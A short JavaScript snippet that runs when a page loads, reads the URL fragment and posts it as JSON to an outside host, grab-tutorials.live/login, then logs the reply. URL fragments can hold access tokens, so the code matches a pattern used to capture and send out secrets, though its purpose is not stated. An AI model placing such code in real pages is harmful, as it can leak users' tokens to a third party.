window.addEventListener('DOMContentLoaded', () => {
  const fragment = window.location.hash.substring(1);

  if (fragment) {
    fetch('https://grab-tutorials.live/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ fragment }),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Worker Response:', data);
      })
      .catch(error => {
        console.error('Error sending fragment:', error);
      });
  }
});
